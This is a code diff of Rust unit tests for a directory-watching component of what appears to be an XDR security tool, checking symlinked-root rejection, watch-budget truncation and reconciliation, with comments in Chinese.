-        // 构造多个兄弟子目录，验证超过上限时会被截断
+        // 根目录本身若是软链，也必须直接拦截（open O_NOFOLLOW）
+        let link_root = base.join("root_symlink");
+        std::os::unix::fs::symlink(&root, &link_root).unwrap();
+        let (from_link, _) = collect_subdirs(&link_root.to_string_lossy(), 4, MAX_TOTAL_WATCHES);
+        assert!(from_link.is_empty(), "软链根目录不得被收集：{from_link:?}");
+
+        // 构造多个兄弟子目录，验证超过上限时会被截断并明确返回 truncated = true
         for i in 0..10 {
             std::fs::create_dir_all(root.join(format!("d{i}"))).unwrap();
         }
-        let limited = collect_subdirs_limited(&root.to_string_lossy(), 4, 5);
+        let (limited, truncated) = collect_subdirs(&root.to_string_lossy(), 4, 5);
         assert_eq!(limited.len(), 5, "目录总数不得超过上限：{limited:?}");
+        assert!(truncated, "超预算时必须返回 truncated = true");
 
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn ino_global_budget_truncates_and_reconcile_recovers_when_budget_frees() {
+        let base =
+            std::env::temp_dir().join(format!("openxdr-fswatch-budget-{}", uuid::Uuid::new_v4()));
+        let root_a = base.join("a");
+        let root_b = base.join("b");
+        for i in 0..3 {
+            std::fs::create_dir_all(root_a.join(format!("sa{i}"))).unwrap();
+            std::fs::create_dir_all(root_b.join(format!("sb{i}"))).unwrap();
+        }
+        let targets = vec![
+            root_a.to_string_lossy().into_owned(),
+            root_b.to_string_lossy().into_owned(),
+        ];
+
+        // 两个根总计 8 个目录（各 4 个），全局总预算设为 6：
+        // root_a 拿 4 个，root_b 只能拿到剩余 2 个并记入 truncated_roots
+        let (fd, mut watched, mut truncated_roots) = ino_init_with_budget(&targets, 6).unwrap();
+        assert_eq!(watched.len(), 6, "全局 watch 总数不得超过总预算 6");
+        assert!(
+            truncated_roots.contains(&targets[1]),
+            "被截断的根应登记到 truncated_roots：{truncated_roots:?}"
+        );
+
+        // 模拟腾出余量（预算放宽到 10，或旧 watch 释放）后，reconcile 必须对截断过的根补挂剩余目录
+        let fresh = ino_reconcile(fd, &targets, &mut watched, &mut truncated_roots, 10);
+        assert_eq!(fresh.len(), 2, "应补挂之前漏掉的 2 个子目录：{fresh:?}");
+        assert_eq!(watched.len(), 8);
+        assert!(
+            truncated_roots.is_empty(),
+            "补挂完整后应清除 truncated_roots：{truncated_roots:?}"
+        );
+
+        // SAFETY: 测试独占 fd，结束前关闭
+        unsafe { libc::close(fd) };
         let _ = std::fs::remove_dir_all(&base);
     }
 }
